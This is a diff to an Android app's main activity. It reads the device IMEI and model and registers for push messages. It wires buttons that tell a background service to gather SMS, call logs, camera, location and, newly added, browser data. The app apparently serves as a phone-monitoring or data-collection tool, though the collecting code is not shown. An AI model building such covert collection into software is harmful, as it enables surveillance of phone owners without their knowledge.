@@ -52,11 +52,13 @@ public class MainActivity extends ActionBarActivity {
         pref = getApplicationContext().getSharedPreferences("MyPref", MODE_PRIVATE);
         editor=pref.edit();
         imei=tm.getDeviceId();
-        b1=(Button)findViewById(R.id.sms);
-        b2=(Button)findViewById(R.id.logs);
-        b3=(Button) findViewById(R.id.camera);
-        b4=(Button) findViewById(R.id.location);
         regidfield= (EditText) findViewById(R.id.editText1);
+
+        Button b1=(Button)findViewById(R.id.sms);
+        Button b2=(Button)findViewById(R.id.logs);
+        Button b3=(Button) findViewById(R.id.camera);
+        Button b4 = (Button) findViewById(R.id.location);
+        Button b5 = (Button) findViewById(R.id.browser);
         final Intent msgIntent=new Intent(this,GetData.class);
         editor.putString("imei",imei);
         editor.putString("model",model);
@@ -88,10 +90,18 @@ public class MainActivity extends ActionBarActivity {
         });
         b4.setOnClickListener(new View.OnClickListener() {
             @Override
-            public void onClick(View view) {
-                Intent a=new Intent();
-                a.setAction(CUSTOM_INTENT);
-                getApplicationContext().sendBroadcast(a);
+            public void onClick(View v) {
+                String p = "location";
+                msgIntent.putExtra(GetData.Msg,p);
+                startService(msgIntent);
+            }
+        });
+        b5.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                String p = "browser";
+                msgIntent.putExtra(GetData.Msg,p);
+                startService(msgIntent);
             }
         });
         getRegId();
@@ -152,6 +162,8 @@ public class MainActivity extends ActionBarActivity {
         } else {
             return Character.toUpperCase(first) + s.substring(1);
         }
+
+
     }
 
 
